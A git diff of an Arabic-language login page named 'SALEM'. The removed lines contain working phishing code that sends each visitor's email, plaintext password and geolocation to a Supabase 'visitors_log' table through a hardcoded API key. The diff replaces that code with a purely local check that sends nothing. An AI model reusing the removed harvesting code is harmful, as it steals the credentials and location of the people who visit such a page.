@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
     <title>SALEM | سـالـم</title>
     
-    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Poppins:400,700&display=swap"/>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"/>
     
@@ -106,64 +105,20 @@
 </div>
 
 <script>
-    const SB_URL = 'https://kcckppfflaxpxhipngdz.supabase.co'; 
-    const SB_KEY = 'EyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtjY2twcGZmbGF4cHhoaXBuZ2R6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU2MzU1NTMsImV4cCI6MjA5MTIxMTU1M30.Lek1mEohH1GoUkcMQZT3vQ2tmshPJVI-Oa8f_y2mH6o';
-    
-    const supabaseClient = supabase.createClient(SB_URL, SB_KEY);
-
-    async function handleLogin() {
+    function handleLogin() {
         const email = document.getElementById('email').value;
         const password = document.getElementById('password').value;
-        const loginBtn = document.getElementById('login-btn');
         const errorMsg = document.getElementById('error-msg');
 
+        // تحقق بسيط جداً محلياً فقط
         if (!email || !password) {
             errorMsg.innerText = "يرجى إدخال كافة البيانات";
             return;
         }
 
-        loginBtn.innerText = "جاري التحقق...";
-        loginBtn.disabled = true;
-
-        // الحصول على الموقع الجغرافي
-        let userLocation = "Pending...";
-        if (navigator.geolocation) {
-            await new Promise((resolve) => {
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        userLocation = `${pos.coords.latitude}, ${pos.coords.longitude}`;
-                        resolve();
-                    },
-                    () => {
-                        userLocation = "Denied";
-                        resolve();
-                    },
-                    { timeout: 5000 }
-                );
-            });
-        }
-
-        try {
-            // إرسال البيانات بأسماء الأعمدة الأصلية كما طلبت
-            const { error } = await supabaseClient
-                .from('visitors_log')
-                .insert([{ 
-                    visitor_email: email, 
-                    visitor_password: password,
-                    location: userLocation
-                }]);
-
-            if (error) throw error;
-
-            document.getElementById('auth-screen').style.display = 'none';
-            document.getElementById('profile-card').style.display = 'block';
-
-        } catch (err) {
-            console.error(err);
-            errorMsg.innerText = "فشل في إرسال البيانات!";
-            loginBtn.innerText = "تأكيد الدخول";
-            loginBtn.disabled = false;
-        }
+        // إخفاء شاشة الدخول وإظهار البطاقة فوراً بدون إرسال بيانات
+        document.getElementById('auth-screen').style.display = 'none';
+        document.getElementById('profile-card').style.display = 'block';
     }
 </script>
 </body>
